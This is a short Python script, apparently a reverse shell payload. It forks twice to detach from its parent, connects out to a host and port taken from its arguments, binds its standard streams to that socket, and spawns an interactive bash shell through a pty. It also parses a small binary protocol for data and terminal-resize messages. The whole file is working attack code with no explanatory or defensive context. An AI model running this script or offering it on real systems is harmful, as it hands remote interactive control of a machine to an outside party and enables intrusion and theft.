import os, time, socket, fcntl, struct, sys, pty, termios


def sock_read(fd):
    global buf
    buf += os.read(fd, 1024)
    ret = b""
    while len(buf) >= 4:
        (op,) = struct.unpack("!B", buf[:1])
        if op == 0x0:
            (length,) = struct.unpack("!H", buf[1:3])
            if len(buf) < 3 + length:
                break
            ret += buf[3 : 3 + length]
            buf = buf[3 + length :]
        elif op == 0x1:
            w, h = struct.unpack("!HH", buf[1:5])
            buf = buf[5:]
            s = struct.pack("HHHH", h, w, 0, 0)
            fcntl.ioctl(3, termios.TIOCSWINSZ, s)
        else:
            raise Exception(f"unknown op {op}")
    if ret == b"":
        return type("", (bytes,), {"__bool__": lambda _: True})()
    return ret


if __name__ == "__main__":
    if os.fork() or os.fork():
        sys.exit(0)
    buf = b""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        if sock.connect((sys.argv[1], int(sys.argv[2]))):
            sys.exit(1)
        sock.setblocking(False)
        os.dup2(sock.fileno(), 0)
        os.dup2(sock.fileno(), 1)
        os.dup2(sock.fileno(), 2)
    pty.spawn(["/bin/bash", "-i"], stdin_read=sock_read)
